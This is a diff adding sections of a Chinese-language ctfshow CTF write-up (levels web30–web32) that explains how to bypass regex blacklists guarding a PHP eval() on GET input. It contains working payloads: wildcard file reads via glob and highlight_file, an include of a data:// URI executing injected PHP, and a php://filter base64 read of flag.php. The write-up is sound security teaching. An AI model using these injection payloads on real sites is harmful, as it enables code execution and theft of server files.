@@ -172,3 +172,232 @@ $flag = 'ctfshow{33a9d6bd-fee1-40ee-9cc1-88067edd1015}';
 ![image-20261101124518736](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261101124518736.png)
 
 ![image-20261101124900727](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261101124900727.png)
+
+---
+
+## web30
+
+代码里和上一题相同的部分我就不注释了
+
+```php
+error_reporting(0);
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match("/flag|system|php/i", $c)){/*一样的正则匹配，这里要绕过的是flag,system,php等三个字符串*/
+        eval($c);
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+### 读懂代码
+
+```php
+ if(!preg_match("/flag|system|php/i", $c))
+```
+
+这一句，依旧用到了preg_match()函数，正则匹配函数，"/.../"是正则的分隔符，“|”表示或，"i"表示不区分大小写，说明，我们在url中输入指令时，不能输入含flag,Flag，system,System,php,PHP等字符串，也就是说，我们没办法像上一题一样用``system()`,也不能写，`flag.php`,我们需要绕过这三个字符串
+
+#### 先扫描一下根目录，看看有什么
+
+```
+...?c=print_r(scandir('/'));
+```
+
+- print_r():print readable,把变量内容以人能读懂的形式打印出来
+- scandir():scan directory扫描一个目录里所有的文件，返回**数组**
+
+#### 为什么要扫描根目录？
+
+因为根目录是我们唯一知道的，确定的目录，也存在装有flag的文件放在根目录下的情况，这里啥也没扫出来
+
+![image-20261102143408646](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261102143408646.png)
+
+### 扫描当前目录
+
+```
+?c=print_r(scandir(getcwd()));
+```
+
+这一句代码按顺序从上到下执行是这样的：
+
+| 函数                    | 作用                               | 输入（）里边填什么 | 输出（返回什么） |
+| ----------------------- | ---------------------------------- | ------------------ | ---------------- |
+| getcwd                  | 取当前工作目录                     | -                  | 返回一个字符串   |
+| scandir：scan directory | 扫描一个目录里所有的文件           | 目录               | 返回**数组**     |
+| print_r：print readable | 把变量内容以人能读懂的形式打印出来 | -                  | -                |
+
+
+
+![image-20261102143253532](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261102143253532.png)
+
+看到了flag.php,说明flag大概率就在这个文件夹里，但是题目过滤掉了flag,system,php，所以我们要绕过它们
+
+### 怎么绕过呢？
+
+关注一下，`?c=print_r(scandir(getcwd()));`返回的内容有哪些文件，flag.php index.php 我们是不是可以利用上一道题学到的通配符这种办法绕过呢
+
+```
+...?c=highlight_file(glob("f*")[0]);//在glob返回的数组中取flag.php，用highlight_file输出flag.php源码
+```
+
+| 函数           | 作用               | 输入                                                         | 输出         |
+| -------------- | :----------------- | ------------------------------------------------------------ | ------------ |
+| highlight_file | 读取并显示文件内容 | 输入需要字符串，刚好glob("f*")[0]返回的就是”flag.php“这串字符串 | 输出文件源码 |
+#### 为什么要有[0]呢？
+
+因为，glob按通配符查找文件/目录的函数，**返回数组**。因为"f*"通配符匹配的是f开头的所有文件，而当前目录下，f开头的有且仅有flag.php这是在扫描当前目录之后我们得知的，[0]表示取的是第一个文件，那不就是唯一的flag.php嘛
+
+![image-20261102151933466](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261102151933466.png)
+
+---
+
+## web31
+
+```php
+error_reporting(0);
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
+        eval($c);
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+### 禁了哪些东西
+
+`flag | system | php | cat | sort | shell | . | 空格 | 单引`
+
+依旧可以沿用上题的解题办法
+
+```
+...?c=print_r(scandir('/'));
+```
+
+```
+?c=print_r(scandir(getcwd()));
+```
+
+```
+...?c=highlight_file(glob("f*")[0]);//在glob返回的数组中取flag.php，用highlight_file输出flag.php源码
+```
+
+### 如果第二步扫描目录，不只一个f开头的文件怎么办？
+
+- 法一：先看具体有哪些文件
+
+  ``` 
+  ?c=print_r(glob("f*"));
+  ```
+
+  假设是：
+
+  ```
+  Array
+  (
+      [0] => fa.php
+      [1] => flag.php//flag在[1]
+      [2] => foo.php
+  )
+  ```
+
+  那就把`...?c=highlight_file(glob("f*")[0]);`中的[0]改成[1]
+
+- 法二：缩小匹配模式
+
+  把glob（“f*）换成
+
+  ```
+  glob("fla*")
+  glob("f?ag*")
+  glob("f[l]ag*")
+  ```
+
+---
+
+## web32
+
+```php
+error_reporting(0);
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
+        eval($c);
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+这题禁的东西可就多了，我们来看，首先要明确`/.../`是分隔符，`/.../i`后边加一个i表示不区分大小写，由此可知，`/.../i`里边的东西就是黑名单
+
+### 怎么看黑名单？
+
+`flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(` 
+
+|:表示或，\ :是转义符，正则匹配里有些字符本身就有特殊含义，所以在匹配它们时需要加转义符，而我们在阅读时可以把转义符去掉，这样来看会更加清晰一点
+
+| 被禁     | 影响                                     |
+| :------- | :--------------------------------------- |
+| `flag`   | 不能写 `flag.php`、`/flag`、`$flag`      |
+| `system` | 不能用 `system()`                        |
+| `php`    | 不能写 `phpinfo()`、`php://`、`flag.php` |
+| `cat`    | 不能用 `cat` 命令                        |
+| `sort`   | 不能用 `sort` 命令                       |
+| `shell`  | 不能用 `shell_exec()`                    |
+| `.`      | 不能写扩展名、路径中的点                 |
+| 空格     | 不能用普通空格分隔代码或命令             |
+| `'`      | 不能用单引号字符串                       |
+| 反引号 ` | 不能用反引号执行命令                     |
+| `echo`   | 不能用 `echo` 输出                       |
+| `;`      | 不能用分号结束语句                       |
+| `(`      | 不能写左括号，**也就是不能正常调用函数** |
+
+###  这题的黑名单那么多，连函数都禁了怎么办？
+
+#### include可以解决（被禁的问题
+
+**include不是函数，它是php语言结构的关键字，它的语法是`include 表达式;`**
+
+但是我们平时写题时见多了`include()`带括号的形式，容易先入为主，以为它是函数，其实不是
+
+#### 双参数
+
+记得之前也提过这个思路，代码中被检查的只有变量C,这时候就可以用双变量，绕过对C的黑名单检查
+
+用双参数绕过的办法查看当前目录下有什么文件
+
+```
+?c=include$_GET[1]?>&1=data://text/plain,<?php print_r(scandir(getcwd()));?>
+```
+
+![image-20261102203954763](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261102203954763.png)
+
+然后发现有flag.php,大概率就是在这里，那问题就回到怎么取flag,php文件里的内容了
+
+#### 为什么include$_GET没有空格也可以？_
+
+按理来说include的表达式是`include 表达式;`因为，php虽然大多数是用空格来分词的，但其实它是靠词法（token）来分词的,这里`$` 不能接在标识符后面，是一个明确的分界，所以不用空格。
+
+疑？？？？这个味道有没有感觉很熟悉？
+include+想要输出文件里的内容 应该怎么写来着
+
+**include+php伪协议+base64过滤**
+
+为什么这么搭配来着，简而言之就是，include它不能碰上php语言的<?php开头,不然就不会把文本内容打印出来，我们就看不到，所以这里需要伪协议破坏掉，就利用base64编码，破环掉开头，让include打出文件内容
+
+具体写法
+
+```
+php://filter/read=convert.base64-encode/resource=flag.php
+```
+
+![image-20261102205605635](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261102205605635.png)
+
+得到之后解码即可
